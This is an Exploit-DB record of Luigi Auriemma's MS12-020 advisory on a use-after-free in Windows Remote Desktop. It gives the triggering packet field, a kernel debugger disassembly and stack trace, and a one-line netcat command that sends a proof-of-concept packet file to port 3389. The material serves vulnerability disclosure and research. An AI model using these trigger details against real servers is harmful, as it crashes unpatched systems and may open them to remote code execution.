{
    "text": "published_time: 2012-03-16 ， id: 16508 ， eid: 18606 ， cve: CVE-2012-0002 ， title: Microsoft Terminal Services - Use-After-Free (MS12-020) - Windows dos Exploit ， author: Luigi Auriemma ， published_time: 2012-03-16 ， verified: Verified ， platform: Windows ， exploit_type: dos ， exploit_url: /download/18606 ， exploit_detail: \r ，                              Luigi Auriemma\r ， Application:  Microsoft Terminal Services / Remote Desktop Services\r ， Versions:     any Windows version before 13 Mar 2012\r ， Platforms:    Windows\r ， Bug:          use after free\r ， Exploitation: remote, versus server\r ， Date:         16 Mar 2012 (found 16 May 2011)\r ， Author:       Luigi Auriemma\r ，               e-mail: aluigi@autistici.org\r ，               web:    aluigi.org\r ， Additional references:\r ， 1) Introduction\r ， 2) Bug\r ， 3) The Code\r ， 4) Fix\r ， 1) Introduction\r ， From vendor's homepage:\r ， \"The Microsoft Remote Desktop Protocol (RDP) provides remote display\r ， and input capabilities over network connections for Windows-based\r ， applications running on a server. RDP is designed to support different\r ， types of network topologies and multiple LAN protocols.\"\r ， 2) Bug\r ， The Remote Desktop Protocol is used by the \"Terminal Services / Remote\r ， Desktop Services\" and works at kernel level on port 3389.\r ， There is an use-after-free vulnerability located in the handling of the\r ， maxChannelIds field of the T.125 ConnectMCSPDU packet (offset 0x2c of\r ， the provided proof-of-concept) when set to a value minor/equal than 5.\r ， The problem happens during the disconnection of the user started with\r ， RDPWD!NM_Disconnect while the effect of the possible code execution is\r ， visible in termdd!IcaBufferAlloc (or termdd!IcaBufferAllocEx on\r ， Windows 7/2008) after termdd!IcaGetPreviousSdLink returns an invalid\r ， memory pointer, the following dump is taken from Windows 2003 Server:\r ，   f761887c 8bff            mov     edi,edi\r ，   f761887e 55              push    ebp\r ，   f761887f 8bec            mov     ebp,esp\r ，   f7618881 56              push    esi\r ，   f7618882 57              push    edi\r ，   f7618883 8b7d08          mov     edi,dword ptr [ebp+8]\r ，   f7618886 8d47ec          lea     eax,[edi-14h]\r ，   f7618889 50              push    eax\r ，   f761888a eb09            jmp     termdd!IcaBufferAlloc+0x19 (f7618895)\r ，   f761888c 8b4618          mov     eax,dword ptr [esi+18h]                  ; we are here\r ，   f761888f 833800          cmp     dword ptr [eax],0                        ; or here\r ，   f7618892 7527            jne     termdd!IcaBufferAlloc+0x3f (f76188bb)    ; must jump\r ，   f7618894 56              push    esi\r ，   f7618895 e878290000      call    termdd!IcaGetPreviousSdLink (f761b212)   ; the new ESI is returned by this function\r ，   f761889a 8bf0            mov     esi,eax\r ，   f761889c 85f6            test    esi,esi\r ，   f761889e 75ec            jne     termdd!IcaBufferAlloc+0x10 (f761888c)\r ，   f76188a0 ff751c          push    dword ptr [ebp+1Ch]\r ，   f76188a3 ff7518          push    dword ptr [ebp+18h]\r ，   f76188a6 ff7514          push    dword ptr [ebp+14h]\r ，   f76188a9 ff7510          push    dword ptr [ebp+10h]\r ，   f76188ac ff750c          push    dword ptr [ebp+0Ch]\r ，   f76188af 57              push    edi\r ，   f76188b0 e8b9fcffff      call    termdd!IcaBufferAllocInternal (f761856e)\r ，   f76188b5 5f              pop     edi\r ，   f76188b6 5e              pop     esi\r ，   f76188b7 5d              pop     ebp\r ，   f76188b8 c21800          ret     18h\r ，   f76188bb 33c0            xor     eax,eax\r ，   f76188bd 53              push    ebx\r ，   f76188be 8d7e10          lea     edi,[esi+10h]\r ，   f76188c1 40              inc     eax\r ，   f76188c2 f00fc107        lock xadd dword ptr [edi],eax\r ，   f76188c6 ff751c          push    dword ptr [ebp+1Ch]\r ，   f76188c9 8b4618          mov     eax,dword ptr [esi+18h]                  ; the same value of before\r ，   f76188cc ff7518          push    dword ptr [ebp+18h]\r ，   f76188cf ff7514          push    dword ptr [ebp+14h]\r ，   f76188d2 ff7510          push    dword ptr [ebp+10h]\r ，   f76188d5 ff750c          push    dword ptr [ebp+0Ch]\r ，   f76188d8 ff761c          push    dword ptr [esi+1Ch]\r ，   f76188db ff10            call    dword ptr [eax]                          ; code execution\r ，   f76188dd 8bd8            mov     ebx,eax\r ，   f76188df 83c8ff          or      eax,0FFFFFFFFh\r ，   f76188e2 f00fc107        lock xadd dword ptr [edi],eax\r ，   f76188e6 7506            jne     termdd!IcaBufferAlloc+0x72 (f76188ee)\r ，   f76188e8 56              push    esi\r ，   f76188e9 e8382f0000      call    termdd!_IcaUnloadSd (f761b826)\r ，   f76188ee 8bc3            mov     eax,ebx\r ，   f76188f0 5b              pop     ebx\r ，   f76188f1 ebc2            jmp     termdd!IcaBufferAlloc+0x39 (f76188b5)\r ，   eax=040b0402 ebx=e1492090 ecx=00390080 edx=00000003 esi=040b0402 edi=e1438240\r ，   eip=f762888c esp=b832f9d8 ebp=b832f9e0 iopl=0         nv up ei pl nz na po nc\r ，   cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010202\r ，   termdd!IcaBufferAlloc+0x10:\r ，   f762888c 8b4618          mov     eax,dword ptr [esi+18h] ds:0023:040b041a=????????\r ，   ChildEBP RetAddr  \r ，   b8b399e0 b89c1c34 termdd!IcaBufferAlloc+0x10\r ，   b8b39a00 b89c1c67 RDPWD!StackBufferAlloc+0x26\r ，   b8b39a2c b89a902c RDPWD!MCSDetachUserRequest+0x29\r ，   b8b39a40 b89a8b44 RDPWD!NMDetachUserReq+0x14\r ，   b8b39a4c b89a9185 RDPWD!NM_Disconnect+0x16\r ，   b8b39a58 b89adcb4 RDPWD!SM_Disconnect+0x27\r ，   b8b39a68 b89a906d RDPWD!SM_OnConnected+0x70\r ，   b8b39a88 b89a8db4 RDPWD!NMAbortConnect+0x23\r ，   b8b39ac0 b89a9d88 RDPWD!NM_Connect+0x86\r ，   b8b39ae0 b89abcfc RDPWD!SM_Connect+0x112\r ，   b8b39b08 b89ac786 RDPWD!WDWConnect+0x368\r ，   b8b39b3c b89a6959 RDPWD!WDWConfConnect+0x94\r ，   b8b39b70 f762c1c7 RDPWD!WD_Ioctl+0x1227\r ，   b8b39b8c f762c5a3 termdd!_IcaCallSd+0x35\r ，   b8b39bac f762ca10 termdd!_IcaCallStack+0x55\r ，   b8b39bf4 f762abcc termdd!IcaDeviceControlStack+0x414\r ，   b8b39c24 f762ad20 termdd!IcaDeviceControl+0x4e\r ，   b8b39c3c 8081d5c3 termdd!IcaDispatch+0x12a\r ，   b8b39c50 808ed4eb nt!IofCallDriver+0x45\r ，   b8b39c64 808ee28d nt!NtWriteFile+0x2943\r ，   b8b39d00 808e6dbc nt!NtWriteFile+0x36e5\r ，   b8b39d34 80883968 nt!NtDeviceIoControlFile+0x2a\r ，   b8b39d64 7c82847c nt!KeReleaseInStackQueuedSpinLockFromDpcLevel+0xb14\r ，   b8b39d68 badb0d00 ntdll!_NLG_Notify+0x14\r ， On Windows 2003 that zone of the memory pointed by ESI+18 using the\r ， provided proof-of-concept is ever in the range 040b02??-040b04??.\r ， The exploitability depends by the possibility of controlling ESI or the\r ， content pointed by it (maybe via a form of heap spraying?), indeed in\r ， my quick tests this zone sometimes is allocated and others it isn't.\r ， Note that on the post-Vista Windows versions (like 7 and 2008) \"seems\"\r ， necessary to have \"Allow connections from computers running any version\r ， of Remote Desktop\" for being vulnerable.\r ， Anyway I'm not totally sure about this so-called limitation because it\r ， looks like dependent by my proof-of-concept only.\r ， The provided proof-of-concept uses the BER integer values set at 32bit\r ， (big endian) in case they could be useful for easier debugging.\r ， Additional details about the protocol:\r ， 3) The Code\r ，   nc SERVER 3389 < termdd_1.dat\r ， resend it multiple times in case of no results and note that this is\r ， just a simple proof-of-concept packet to quickly test the bug so it's\r ， not optimized at all.\r ， 4) Fix"
}